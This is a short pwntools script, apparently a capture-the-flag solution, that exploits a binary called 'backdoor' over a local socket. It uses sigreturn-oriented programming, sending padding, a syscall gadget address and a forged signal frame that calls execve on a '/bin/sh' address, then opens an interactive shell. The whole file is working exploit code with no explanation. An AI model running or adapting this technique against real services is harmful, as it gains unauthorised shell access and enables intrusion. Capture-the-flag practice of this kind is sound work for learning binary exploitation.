from pwn import *

#p = process('./backdoor')
p = remote('127.0.0.1',33929)
context.arch = 'amd64'
syscall = 0x0000000000401165
binsh = 0x400100
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh 
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall
payload = b'a' * 8 + p64(syscall) + bytes(sigframe)
p.sendlineafter('章魚哥 :',payload)

p.interactive()





